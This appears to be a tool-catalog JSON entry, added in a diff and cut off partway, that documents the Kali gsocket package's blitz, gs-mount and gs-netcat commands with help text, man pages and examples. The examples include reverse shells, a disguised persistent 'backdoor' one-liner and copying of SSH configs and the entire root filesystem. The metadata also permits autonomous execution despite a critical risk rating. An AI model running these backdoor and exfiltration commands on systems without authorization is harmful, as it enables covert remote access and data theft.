@@ -1,0 +1,1000 @@
+{
+  "id": "kali:gsocket",
+  "kind": "kali_source_package",
+  "name": "gsocket",
+  "title": "gsocket",
+  "summary": "### gsocket",
+  "version": "1.4.43-4",
+  "architectures": [
+    "any"
+  ],
+  "homepage": "https://github.com/hackerschoice/gsocket",
+  "repository": "https://salsa.debian.org/debian/gsocket",
+  "metapackages": [
+    "kali-linux-everything"
+  ],
+  "install": {
+    "apt": "sudo apt install gsocket"
+  },
+  "packages": [
+    {
+      "name": "gsocket"
+    }
+  ],
+  "commands": [
+    {
+      "name": "blitz",
+      "description": "Securely transfer files between two workstations through NAT/Firewall.",
+      "usage": null,
+      "arguments": [
+        {
+          "flags": [
+            "-l"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Server Mode.",
+          "default": "mode is client",
+          "choices": null,
+          "raw": "  -l           Server Mode."
+        },
+        {
+          "flags": [
+            "-s"
+          ],
+          "metavar": "secret",
+          "takes_value": true,
+          "description": "Secret (e.g. password).",
+          "default": null,
+          "choices": null,
+          "raw": "  -s <secret>  Secret (e.g. password)."
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Read Secret from file.",
+          "default": null,
+          "choices": null,
+          "raw": "  -k <file>    Read Secret from file."
+        },
+        {
+          "flags": [
+            "-f"
+          ],
+          "metavar": "list",
+          "takes_value": true,
+          "description": "Read list of file names from FILE [or - for stdin]",
+          "default": null,
+          "choices": null,
+          "raw": "  -f <list>\tRead list of file names from FILE [or - for stdin]"
+        },
+        {
+          "flags": [
+            "-o"
+          ],
+          "metavar": "RSOPT=val Options passed to rsync.",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "  -o RSOPT=val Options passed to rsync."
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use TOR. The blitz tool will connect via TOR to the GSRN. This re-",
+          "default": null,
+          "choices": null,
+          "raw": "     -T      Use TOR. The blitz tool will connect via TOR to the GSRN. This re-"
+        }
+      ],
+      "raw_help": "root@kali:~# blitz -h\n blitz [-k file] [-s password] [-l] [FILES ...]\n  -l           Server Mode.\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n  -f <list>\tRead list of file names from FILE [or - for stdin]\n  -o RSOPT=val Options passed to rsync.\n\nExample:\n   $ blitz -s MySecret -l             # Server\n   $ blitz -s MySecret *.dat          # Client\n \n ...limiting transfer rate to 10kB/sec\n   $ blitz -s MySecret -o 'RSOPT=--bwlimit=10 -v' /etc/*.conf *.dat\n \n ...reading the file list from standard-in\n   $ cd /etc\n   $ find . -name '*.mp3' | blitz -s MySecret -f -\n \n ...limit the amount of path information by inserting a dot and slash\n   $ blitz -s MySecret ~/tools/./upx/mp3\n \n See 'man gs-netcat' and 'man rsync' for more options.",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "$ mkdir /tmp/foo && cd /tmp/foo\n$ blitz -s MySecret -l",
+          "template": null,
+          "original_sha256": "577c28d3e8d5a80170f11c27c02c9d05099445eb0f480925c9a38addbd4b327e"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret file.dat",
+          "template": null,
+          "original_sha256": "4df7b761fffd2565c97fd001b33a0052715f81cd1692f6a50c16ef0dfae5beda"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret /etc/ssh/ssh*config",
+          "template": null,
+          "original_sha256": "f213141ba4ebc6d1a4912857c2b07dc9b2b8d977fb9c65d29b218e7a4c983e3d"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret /etc/./ssh/ssh*config\nThe  received  files  will  be  stored   to   /tmp/foo/ssh/   instead   of\n/tmp/foo/etc/ssh.",
+          "template": null,
+          "original_sha256": "4b6cae53721ef9a8c9216a75f7e29c339a152ec410c678f5ec84333f9c394744"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret -o 'RSOPT=--bwlimit=10' /usr/./share",
+          "template": null,
+          "original_sha256": "fb3481f4aa4e93888a16226d2413e16ea792638e9731498087d37979ec39a133"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret -o 'RSOPT=-x' /",
+          "template": null,
+          "original_sha256": "388dcb6e8ae2b2ac4fe0cf6f84042f17997dbf09d28cf5edb4e8fd349ce4418c"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ find . -name '*.conf' | blitz -s MySecret -f -",
+          "template": null,
+          "original_sha256": "d1efd9531fc3c8be921afa1a3c300de8fabe1b85e6d52f48ea9e1ef86973fe56"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ blitz -s MySecret -l -D -T",
+          "template": null,
+          "original_sha256": "09498af69742bcfc1ac06f28e02751539a5d7b3f39af66688a796a84355c3bcf"
+        },
+        {
+          "status": "operational_example",
+          "command": "blitz [-k file] [-s password] [-l] [FILES ...]",
+          "template": null,
+          "original_sha256": "a7bc206a188f52c3587a9c7bd010d7b32102371c36453560628bde23c359cd82"
+        }
+      ],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "rat"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "blitz [-k file] [-s password] [-l] [FILES ...]\n   -l           Server Mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n   -f <list>\tRead list of file names from FILE [or - for stdin]\n   -o RSOPT=val Options passed to rsync.\n \n Example:\n    $ blitz -s MySecret -l             # Server\n    $ blitz -s MySecret *.dat          # Client\n\n...limiting transfer rate to 10kB/sec\n    $ blitz -s MySecret -o 'RSOPT=--bwlimit=10 -v' /etc/*.conf *.dat\n\n...reading the file list from standard-in\n    $ cd /etc\n    $ find . -name '*.mp3' | blitz -s MySecret -f -\n\n...limit the amount of path information by inserting a dot and slash\n    $ blitz -s MySecret ~/tools/./upx/mp3\n\nSee 'man gs-netcat' and 'man rsync' for more options.",
+        "-h": "blitz [-k file] [-s password] [-l] [FILES ...]\n   -l           Server Mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n   -f <list>\tRead list of file names from FILE [or - for stdin]\n   -o RSOPT=val Options passed to rsync.\n \n Example:\n    $ blitz -s MySecret -l             # Server\n    $ blitz -s MySecret *.dat          # Client\n\n...limiting transfer rate to 10kB/sec\n    $ blitz -s MySecret -o 'RSOPT=--bwlimit=10 -v' /etc/*.conf *.dat\n\n...reading the file list from standard-in\n    $ cd /etc\n    $ find . -name '*.mp3' | blitz -s MySecret -f -\n\n...limit the amount of path information by inserting a dot and slash\n    $ blitz -s MySecret ~/tools/./upx/mp3\n\nSee 'man gs-netcat' and 'man rsync' for more options.",
+        "help": "Enter Secret (or press Enter to generate): rsync: connection unexpectedly closed (0 bytes received so far) [sender]\nrsync error: unexplained error (code 61) at io.c(232) [sender=3.4.4]",
+        "man": "BLITZ(1)                     General Commands Manual                   BLITZ(1)\n\nNAME\n     blitz   --  Securely  transfer  files  between  two  workstations  through\n     NAT/Firewall.\n\nSYNOPSIS\n     blitz [-lT] [-s secret] [-k keyfile] [-f list] [-o RSOPT=] [files ...]\n\nDESCRIPTION\n     The blitz utility is a wrapper script for gs-netcat and rsync.  It  allows\n     one  to  send  files  from  one workstation to another workstation via the\n     Global Socket Relay Network (GSRN).\n\n     A typical use-case is where both workstations are separated by a  Firewall\n     or NAT and not able to establish a direct connection between each other.\n\nOPTIONS\n     -l      Server mode. The default mode is client.\n\n     -s secret\n             A  password  chosen  by  the user. Both users need to use the same\n             password to connect.\n\n     -k FILE\n             A file containing the password.\n\n     -f FILE\n             Read list of file names from FILE. If FILE is -, the list will  be\n             read from standard input.\n\n     -o RSOPT=\n             Options passed to rsync. See rsync(1) for available options.\n\n     -T      Use TOR. The blitz tool will connect via TOR to the GSRN. This re-\n             quires TOR to be installed and running. The IP and PORT of the TOR\n             server can be set using environment variables.\n\n     See gs-netcat(1) for more options.\n\nEXAMPLES\n     Listen for clients with password 'MySecret':\n           $ mkdir /tmp/foo && cd /tmp/foo\n           $ blitz -s MySecret -l\n\n     Copy 'file.dat' to /tmp/foo/file.dat on the server:\n           $ blitz -s MySecret file.dat\n\n     Copy '/etc/ssh/ssh*config' to /tmp/foo/etc/ssh/ on the server:\n           $ blitz -s MySecret /etc/ssh/ssh*config\n\n     It  is  also possible to limit the amount of path information that is sent\n     as implied directories for each path you specify. You can insert a dot and\n     a slash into the source path, like this:\n\n           $ blitz -s MySecret /etc/./ssh/ssh*config\n     The  received  files  will  be  stored   to   /tmp/foo/ssh/   instead   of\n     /tmp/foo/etc/ssh.\n\n     Copy recursively and limit bandwidth to 10kB/sec:\n           $ blitz -s MySecret -o 'RSOPT=--bwlimit=10' /usr/./share\n\n     Copy the entire root file-system:\n           $ blitz -s MySecret -o 'RSOPT=-x' /\n\n     Copy specific files read from standard input:\n           $ find . -name '*.conf' | blitz -s MySecret -f -\n\n     Run a permanent server (daemon) through TOR:\n           $ blitz -s MySecret -l -D -T\n\nENVIRONMENT\n     See gs-netcat(1) for a list of supported environment variables.\n\nSEE ALSO\n     gsocket(1), gs-netcat(1), gs-sftp(1), gs-mount(1), rsync(1)\n\nBUGS\n     Efforts have been made to have blitz \"do the right thing\" in all its vari-\n     ous  modes. If you believe that it is doing the wrong thing under whatever\n     circumstances, please notify me (skyper@thc.org) and tell me how you think\n     it should behave.\n\nDebian                          October 12, 2020                       BLITZ(1)",
+        "apropos": "blitz (1)            - Securely transfer files between two workstations throu..."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/blitz",
+        "size_bytes": 5841,
+        "is_symlink": false,
+        "file_type": "Bourne-Again shell script, ASCII text executable"
+      }
+    },
+    {
+      "name": "gs-mount",
+      "description": "Secure filesystem client through via Global Socket.",
+      "usage": null,
+      "arguments": [
+        {
+          "flags": [
+            "-l"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Server Mode.",
+          "default": "mode is client",
+          "choices": null,
+          "raw": "  -l           Server Mode."
+        },
+        {
+          "flags": [
+            "-R"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Server in read-only mode.",
+          "default": null,
+          "choices": null,
+          "raw": "  -R           Server in read-only mode."
+        },
+        {
+          "flags": [
+            "-s"
+          ],
+          "metavar": "secret",
+          "takes_value": true,
+          "description": "Secret (e.g. password).",
+          "default": null,
+          "choices": null,
+          "raw": "  -s <secret>  Secret (e.g. password)."
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Read Secret from file.",
+          "default": null,
+          "choices": null,
+          "raw": "  -k <file>    Read Secret from file."
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use  TOR. The gs-mount tool will connect via TOR to the GSRN. This",
+          "default": null,
+          "choices": null,
+          "raw": "     -T      Use  TOR. The gs-mount tool will connect via TOR to the GSRN. This"
+        }
+      ],
+      "raw_help": "root@kali:~# gs-mount -h\n gs-mount [-k file] [-s password] [-l] [mount point]\n \n  -l           Server Mode.\n  -R           Server in read-only mode.\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n\n Example:\n   $ gs-mount -s MySecret -l             # Server\n   $ gs-mount -s MySecret                # Client\n \n See 'gs-netcat -h' for more options.",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "$ gs-mount -s MySecret -l",
+          "template": null,
+          "original_sha256": "13a6c097383478f41ceceb1206c8a4be367c418d82bfa78f8a81c153e150010c"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-mount -s MySecret ~/gs-alice",
+          "template": null,
+          "original_sha256": "89a27d657b3c00658f1f9f40aa44f08f032a67fc8eecfde71d414806b40f6601"
+        },
+        {
+          "status": "operational_example",
+          "command": "gs-mount [-k file] [-s password] [-l] [mount point]",
+          "template": null,
+          "original_sha256": "bebebafc87161b55ada877b2d3783150e4d3f6b809217aa861ca0f8e3d6ab104"
+        }
+      ],
+      "risk": {
+        "level": "low",
+        "signals": [],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "gs-mount [-k file] [-s password] [-l] [mount point]\n\n   -l           Server Mode.\n   -R           Server in read-only mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n \nExample:\n    $ gs-mount -s MySecret -l             # Server\n    $ gs-mount -s MySecret                # Client\n\nSee 'gs-netcat -h' for more options.",
+        "-h": "gs-mount [-k file] [-s password] [-l] [mount point]\n\n   -l           Server Mode.\n   -R           Server in read-only mode.\n   -s <secret>  Secret (e.g. password).\n   -k <file>    Read Secret from file.\n \nExample:\n    $ gs-mount -s MySecret -l             # Server\n    $ gs-mount -s MySecret                # Client\n\nSee 'gs-netcat -h' for more options.",
+        "help": "Enter Secret (or press Enter to generate): =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)\nsshfs not found. Try 'apt-get install sshfs' or check PATH=?",
+        "man": "GS-MOUNT(1)                  General Commands Manual                GS-MOUNT(1)\n\nNAME\n     gs-mount -- Secure filesystem client through via Global Socket.\n\nSYNOPSIS\n     gs-mount [-lTR] [-s secret] [-k keyfile] [mountpoint]\n\nDESCRIPTION\n     The  gs-mount  utility is a wrapper script for gs-netcat. It allows a user\n     to mount and access a filesystem from another user via the  Global  Socket\n     Relay  Network  (GSRN).  This is useful in a scenario where both users are\n     behind NAT/Firewall and unable to connect to each other directly.\n\nOPTIONS\n     -s secret\n             A password chosen by the user. Both users need  to  use  the  same\n             password to connect.\n\n     -k FILE\n             A file containing the password.\n\n     -l      Server mode. The default mode is client.\n\n     -R      Places  server  (-l) into a read-only mode. Attempts to open files\n             for writing, as well as other operations that change the state  of\n             the filesystem, will be denied.\n\n     -T      Use  TOR. The gs-mount tool will connect via TOR to the GSRN. This\n             requires TOR to be installed and running. The IP and PORT  of  the\n             TOR server can be set using environment variables.\n\n     See gs-netcat(1) for more options.\n\nEXAMPLES\n     Example 1 - Alice sharing her current directory:\n           $ gs-mount -s MySecret -l\n\n     Bob mounting Alice's directory to ~/gs-alice:\n           $ gs-mount -s MySecret ~/gs-alice\n\nENVIRONMENT\n     See gs-netcat(1) for a list of supported environment variables.\n\nSEE ALSO\n     gsocket(1), gs-netcat(1), gs-sftp(1), blitz(1), sshfs(1)\n\nBUGS\n     Efforts  have  been  made to have gs-mount \"do the right thing\" in all its\n     various modes. If you believe that it is doing the wrong thing under what-\n     ever circumstances, please notify me (skyper@thc.org) and tell me how  you\n     think it should behave.\n\nDebian                          October 12, 2020                    GS-MOUNT(1)",
+        "apropos": "gs-mount (1)         - Secure filesystem client through via Global Socket."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/gs-mount",
+        "size_bytes": 2425,
+        "is_symlink": false,
+        "file_type": "Bourne-Again shell script, ASCII text executable, with very long lines (384)"
+      }
+    },
+    {
+      "name": "gs-netcat",
+      "description": "Transfer data, forward traffic and execute commands on a remote host. Securely.",
+      "usage": null,
+      "arguments": [
+        {
+          "flags": [
+            "-s"
+          ],
+          "metavar": "secret",
+          "takes_value": true,
+          "description": "Secret (e.g. password).",
+          "default": null,
+          "choices": null,
+          "raw": " -s <secret>  Secret (e.g. password)."
+        },
+        {
+          "flags": [
+            "-k"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Read Secret from file.",
+          "default": null,
+          "choices": null,
+          "raw": " -k <file>    Read Secret from file."
+        },
+        {
+          "flags": [
+            "-r"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Receive-only. Terminate when no more data.",
+          "default": null,
+          "choices": null,
+          "raw": " -r           Receive-only. Terminate when no more data."
+        },
+        {
+          "flags": [
+            "-I"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Ignore EOF on stdin.",
+          "default": null,
+          "choices": null,
+          "raw": " -I           Ignore EOF on stdin."
+        },
+        {
+          "flags": [
+            "-l"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Listening server [default: client]",
+          "default": "client]",
+          "choices": null,
+          "raw": " -l           Listening server [default: client]"
+        },
+        {
+          "flags": [
+            "-g"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Generate a Secret (random)",
+          "default": null,
+          "choices": null,
+          "raw": " -g           Generate a Secret (random)"
+        },
+        {
+          "flags": [
+            "-v"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Verbose. -vv more verbose. -vvv insanely verbose",
+          "default": null,
+          "choices": null,
+          "raw": " -v           Verbose. -vv more verbose. -vvv insanely verbose"
+        },
+        {
+          "flags": [
+            "-q"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Quiet. No log output",
+          "default": null,
+          "choices": null,
+          "raw": " -q           Quiet. No log output"
+        },
+        {
+          "flags": [
+            "-w"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Wait for server to become available [client only]",
+          "default": null,
+          "choices": null,
+          "raw": " -w           Wait for server to become available [client only]"
+        },
+        {
+          "flags": [
+            "-C"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Disable encryption",
+          "default": null,
+          "choices": null,
+          "raw": " -C           Disable encryption"
+        },
+        {
+          "flags": [
+            "-T"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use TOR or any Socks proxy (See gs-netcat(1))",
+          "default": null,
+          "choices": null,
+          "raw": " -T           Use TOR or any Socks proxy (See gs-netcat(1))"
+        },
+        {
+          "flags": [
+            "-L"
+          ],
+          "metavar": "file",
+          "takes_value": true,
+          "description": "Logfile",
+          "default": null,
+          "choices": null,
+          "raw": " -L <file>    Logfile"
+        },
+        {
+          "flags": [
+            "-t"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Check if peer is listening (do not connect)",
+          "default": null,
+          "choices": null,
+          "raw": " -t           Check if peer is listening (do not connect)"
+        },
+        {
+          "flags": [
+            "-S"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Act as a SOCKS server [needs -l]",
+          "default": null,
+          "choices": null,
+          "raw": " -S           Act as a SOCKS server [needs -l]"
+        },
+        {
+          "flags": [
+            "-D"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Daemon & Watchdog mode [background]",
+          "default": null,
+          "choices": null,
+          "raw": " -D           Daemon & Watchdog mode [background]"
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "metavar": "IP",
+          "takes_value": true,
+          "description": "IPv4 address for port forwarding",
+          "default": null,
+          "choices": null,
+          "raw": " -d <IP>      IPv4 address for port forwarding"
+        },
+        {
+          "flags": [
+            "-p"
+          ],
+          "metavar": "port",
+          "takes_value": true,
+          "description": "Port to listen on or forward to",
+          "default": null,
+          "choices": null,
+          "raw": " -p <port>    Port to listen on or forward to"
+        },
+        {
+          "flags": [
+            "-u"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Use UDP [requires -p]",
+          "default": null,
+          "choices": null,
+          "raw": " -u           Use UDP [requires -p]"
+        },
+        {
+          "flags": [
+            "-i"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Interactive login shell (TTY) [Ctrl-e q to terminate]",
+          "default": null,
+          "choices": null,
+          "raw": " -i           Interactive login shell (TTY) [Ctrl-e q to terminate]"
+        },
+        {
+          "flags": [
+            "-e"
+          ],
+          "metavar": "cmd",
+          "takes_value": true,
+          "description": "Execute command [e.g. \"bash -il\" or \"id\"]",
+          "default": null,
+          "choices": null,
+          "raw": " -e <cmd>     Execute command [e.g. \"bash -il\" or \"id\"]"
+        },
+        {
+          "flags": [
+            "-m"
+          ],
+          "metavar": null,
+          "takes_value": false,
+          "description": "Display man page",
+          "default": null,
+          "choices": null,
+          "raw": " -m           Display man page"
+        },
+        {
+          "flags": [
+            "-liqD",
+            "-a",
+            "-bash"
+          ],
+          "metavar": "\" SHELL=/bin/bash exec /usr/local/bin/gs-netcat",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "           -liqD\" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)"
+        }
+      ],
+      "raw_help": "root@kali:~# gs-netcat -h\n gs-netcat [-skrlgvqwCTLtSDuim] [-s secret] [-e cmd] [-p port] [-d ip]\n Version 1.4.42, Jun 28 2024 02:48:58 [OpenSSL 3.2.2 4 Jun 2024]\n -s <secret>  Secret (e.g. password).\n -k <file>    Read Secret from file.\n -r           Receive-only. Terminate when no more data.\n -I           Ignore EOF on stdin.\n -l           Listening server [default: client]\n -g           Generate a Secret (random)\n -v           Verbose. -vv more verbose. -vvv insanely verbose\n -q           Quiet. No log output\n -w           Wait for server to become available [client only]\n -C           Disable encryption\n -T           Use TOR or any Socks proxy (See gs-netcat(1))\n -L <file>    Logfile\n -t           Check if peer is listening (do not connect)\n -S           Act as a SOCKS server [needs -l]\n -D           Daemon & Watchdog mode [background]\n -d <IP>      IPv4 address for port forwarding\n -p <port>    Port to listen on or forward to\n -u           Use UDP [requires -p]\n -i           Interactive login shell (TTY) [Ctrl-e q to terminate]\n -e <cmd>     Execute command [e.g. \"bash -il\" or \"id\"]\n -m           Display man page\n  \n Example to forward traffic from port 2222 to 192.168.6.7:22:\n   $ gs-netcat -l -d 192.168.6.7 -p 22     # Server\n   $ gs-netcat -p 2222                     # Client\n Example to act as a SOCKS proxy\n   $ gs-netcat -l -S                       # Server\n   $ gs-netcat -p 1080                     # Client\n Example file transfer:\n   $ gs-netcat -l -r >warez.tar.gz         # Server\n   $ gs-netcat <warez.tar.gz               # Client\n Example for a reverse shell:\n   $ gs-netcat -l -i                       # Server\n   $ gs-netcat -i                          # Client",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l",
+          "template": null,
+          "original_sha256": "fcc80c3c6b702e02950b8a6c420b61f23359e71ce034ba8c68bd3564b90334b4"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret",
+          "template": null,
+          "original_sha256": "2d4256347109cbb3be9a4d1d90be35c02c4d7f44e684c028f9fa3f7aac3aa509"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -i",
+          "template": null,
+          "original_sha256": "013cbe3d4b7b09fcca0179411a057ce711e23c882811de36ffe3439b4ddb6719"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -i",
+          "template": null,
+          "original_sha256": "42976737cb6fdc6526b98151ce60b53229869dad7b65568e90dfdcefa4f59d94"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -i -T",
+          "template": null,
+          "original_sha256": "eaa32e8f2b09d5d5386b9f303986a5b12bc3bea32fcee2db17763ed2ef9c891b"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ export GSOCKET_SOCKS_IP=127.0.0.1\n$ export GSOCKET_SOCKS_PORT=1080\n$ gs-netcat -s MySecret -i -T",
+          "template": null,
+          "original_sha256": "a42949e30aec9c0b258e1c542129c4c630cc2550ee17cbdf4f307393c435c228"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -e 'echo hello world; id; exit'",
+          "template": null,
+          "original_sha256": "e028aed084ba817acf3d46334845dec399ff42db5b5816b6c6bd5e7e573b03a6"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -r >warez.tar.gz",
+          "template": null,
+          "original_sha256": "c3011023d2a51b13f97b05bd2b9148413e156729f73de6a92dce417c244e1a3d"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret <warez.tar.gz",
+          "template": null,
+          "original_sha256": "c95465c3070dc82f2f5320e7d219361b493728ac6d36582a41266def3b74bb70"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -S",
+          "template": null,
+          "original_sha256": "61489067aabc3b9e3d8a798eee8e4c20091824f3e08e55323ad99c98b9f09484"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -p 1080",
+          "template": null,
+          "original_sha256": "b86f75929d981e524dcb9a5a9840cc11f11ff638e99cc6d0da384e1680e09d02"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22",
+          "template": null,
+          "original_sha256": "b5038a9524779006aaec360aea9d42f67ab9f023f5e95bd5ce297c26b39f385a"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -p 2222\n$ ssh -p 2222 root@127.0.0.1",
+          "template": null,
+          "original_sha256": "4c2a088e4334d7ab5e289cb0768b2333937f0060a26272e09bed2990f703b883"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ ssh -o ProxyCommand='gs-netcat -s MySecret' root@ignored",
+          "template": null,
+          "original_sha256": "1807c1a9bd35d2276629b40376ec6b9b5bccfac2b29cabe83e22f0dc2bf82355"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ gs-netcat -s MySecret -l -e /usr/lib/sftp-server",
+          "template": null,
+          "original_sha256": "6a67c82fe0340290eef7b85c7d1cff9604290c73393f3722567ac399e9e305f9"
+        },
+        {
+          "status": "operational_example",
+          "command": "$ export GSOCKET_ARGS='-s MySecret'\n$ sftp -D gs-netcat",
+          "template": null,
+          "original_sha256": "8b53a16796fa77001c705477635615b2f001026aa0ecf7965ba3e5e25ba2ea48"
+        },
+        {
+          "status": "operational_example",
+          "command": "list - also known as 'backdoor':\n$ (GSOCKET_ARGS=\"-s MySecret -liqD\" exec -a -bash gs-netcat)",
+          "template": null,
+          "original_sha256": "cc219fab7a93ed538978fd2050813fd36e5cee9b88a28704e44d15aecf15a6c9"
+        },
+        {
+          "status": "operational_example",
+          "command": "killall  -0  gs-netcat  2>/dev/null  ||  (GSOCKET_ARGS=\"-s MySecret3\n-liqD\" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)",
+          "template": null,
+          "original_sha256": "22eff8467fc910c59e1b45e32fa101cebb9ac96b0bd61a7db90ebf7fa88113ab"
+        },
+        {
+          "status": "operational_example",
+          "command": "gs-netcat [-skrlgvqwCTLtSDuim] [-s secret] [-e cmd] [-p port] [-d ip]",
+          "template": null,
+          "original_sha256": "fa328d42dc3b803d364c4a05c3b8e7d3f7078c3431fdf9288b5e6f89317f88a7"
+        }
+      ],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "rat",
+          "reverse shell"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "gs-netcat [-skrlgvqwCTLtSDuim] [-s secret] [-e cmd] [-p port] [-d ip]\nVersion 1.4.42, Jun 28 2024 02:48:58 [OpenSSL 3.2.2 4 Jun 2024]\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n  -r           Receive-only. Terminate when no more data.\n  -I           Ignore EOF on stdin.\n  -l           Listening server [default: client]\n  -g           Generate a Secret (random)\n  -v           Verbose. -vv more verbose. -vvv insanely verbose\n  -q           Quiet. No log output\n  -w           Wait for server to become available [client only]\n  -C           Disable encryption\n  -T           Use TOR or any Socks proxy (See gs-netcat(1))\n  -L <file>    Logfile\n  -t           Check if peer is listening (do not connect)\n  -S           Act as a SOCKS server [needs -l]\n  -D           Daemon & Watchdog mode [background]\n  -d <IP>      IPv4 address for port forwarding\n  -p <port>    Port to listen on or forward to\n  -u           Use UDP [requires -p]\n  -i           Interactive login shell (TTY) [Ctrl-e q to terminate]\n  -e <cmd>     Execute command [e.g. \"bash -il\" or \"id\"]\n  -m           Display man page\n   \nExample to forward traffic from port 2222 to 192.168.6.7:22:\n    $ gs-netcat -l -d 192.168.6.7 -p 22     # Server\n    $ gs-netcat -p 2222                     # Client\nExample to act as a SOCKS proxy\n    $ gs-netcat -l -S                       # Server\n    $ gs-netcat -p 1080                     # Client\nExample file transfer:\n    $ gs-netcat -l -r >warez.tar.gz         # Server\n    $ gs-netcat <warez.tar.gz               # Client\nExample for a reverse shell:\n    $ gs-netcat -l -i                       # Server\n    $ gs-netcat -i                          # Client",
+        "-h": "gs-netcat [-skrlgvqwCTLtSDuim] [-s secret] [-e cmd] [-p port] [-d ip]\nVersion 1.4.42, Jun 28 2024 02:48:58 [OpenSSL 3.2.2 4 Jun 2024]\n  -s <secret>  Secret (e.g. password).\n  -k <file>    Read Secret from file.\n  -r           Receive-only. Terminate when no more data.\n  -I           Ignore EOF on stdin.\n  -l           Listening server [default: client]\n  -g           Generate a Secret (random)\n  -v           Verbose. -vv more verbose. -vvv insanely verbose\n  -q           Quiet. No log output\n  -w           Wait for server to become available [client only]\n  -C           Disable encryption\n  -T           Use TOR or any Socks proxy (See gs-netcat(1))\n  -L <file>    Logfile\n  -t           Check if peer is listening (do not connect)\n  -S           Act as a SOCKS server [needs -l]\n  -D           Daemon & Watchdog mode [background]\n  -d <IP>      IPv4 address for port forwarding\n  -p <port>    Port to listen on or forward to\n  -u           Use UDP [requires -p]\n  -i           Interactive login shell (TTY) [Ctrl-e q to terminate]\n  -e <cmd>     Execute command [e.g. \"bash -il\" or \"id\"]\n  -m           Display man page\n   \nExample to forward traffic from port 2222 to 192.168.6.7:22:\n    $ gs-netcat -l -d 192.168.6.7 -p 22     # Server\n    $ gs-netcat -p 2222                     # Client\nExample to act as a SOCKS proxy\n    $ gs-netcat -l -S                       # Server\n    $ gs-netcat -p 1080                     # Client\nExample file transfer:\n    $ gs-netcat -l -r >warez.tar.gz         # Server\n    $ gs-netcat <warez.tar.gz               # Client\nExample for a reverse shell:\n    $ gs-netcat -l -i                       # Server\n    $ gs-netcat -i                          